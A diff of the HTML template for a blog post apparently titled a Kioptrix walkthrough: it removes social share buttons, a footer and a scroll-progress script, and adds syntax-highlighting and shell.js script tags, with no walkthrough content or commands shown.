-            <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
-        </a>
-        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:2368/kioptrix-walkthrough-3/" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
-            <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>
-        </a>
-    </div>
-    <progress class="progress" value="0">
-        <div class="progress-container">
-            <span class="progress-bar"></span>
-        </div>
-    </progress>
-</div>
-
-
-
-
-        <footer class="site-footer outer">
-            <div class="site-footer-content inner">
-                <section class="copyright"><a href="../">rootshellz</a> © 2018</section>
-                <nav class="site-footer-nav">
-                    <a href="../">Latest Posts</a>
-                    
-                    <a href="https://twitter.com/rootshellz" target="_blank" rel="noopener">Twitter</a>
-                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
-                </nav>
-            </div>
-        </footer>
-
-    </div>
-
-
-    <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
-    </script>
-    <script type="text/javascript" src="../assets/js/jquery.fitvids.js?v=398b9cd8b3"></script>
-
-
-    <script>
-
-// NOTE: Scroll performance is poor in Safari
-// - this appears to be due to the events firing much more slowly in Safari.
-//   Dropping the scroll event and using only a raf loop results in smoother
-//   scrolling but continuous processing even when not scrolling
-$(document).ready(function () {
-    // Start fitVids
-    var $postContent = $(".post-full-content");
-    $postContent.fitVids();
-    // End fitVids
-
-    var progressBar = document.querySelector('progress');
-    var header = document.querySelector('.floating-header');
-    var title = document.querySelector('.post-full-title');
-
-    var lastScrollY = window.scrollY;
-    var lastWindowHeight = window.innerHeight;
-    var lastDocumentHeight = $(document).height();
-    var ticking = false;
-
-    function onScroll() {
-        lastScrollY = window.scrollY;
-        requestTick();
-    }
-
-    function onResize() {
-        lastWindowHeight = window.innerHeight;
-        lastDocumentHeight = $(document).height();
-        requestTick();
-    }
-
-    function requestTick() {
-        if (!ticking) {
-            requestAnimationFrame(update);
-        }
-        ticking = true;
-    }
-
-    function update() {
-        var trigger = title.getBoundingClientRect().top + window.scrollY;
-        var triggerOffset = title.offsetHeight + 35;
-        var progressMax = lastDocumentHeight - lastWindowHeight;
-
-        // show/hide floating header
-        if (lastScrollY >= trigger + triggerOffset) {
-            header.classList.add('floating-active');
-        } else {
-            header.classList.remove('floating-active');
-        }
-
-        progressBar.setAttribute('max', progressMax);
-        progressBar.setAttribute('value', lastScrollY);
-
-        ticking = false;
-    }
-
-    window.addEventListener('scroll', onScroll, {passive: true});
-    window.addEventListener('resize', onResize, false);
-
-    update();
-
-});
-</script>
-
+    </footer>
 
     <script type="text/javascript" src="https://rootshellz.github.io/prism.js"></script>
 
+    <script type="text/javascript" src="../assets/highlighter/prettify.js?v=d84a20ab2f"></script>
+    <script type="text/javascript" src="../assets/js/shell.js?v=d84a20ab2f"></script>
 </body>
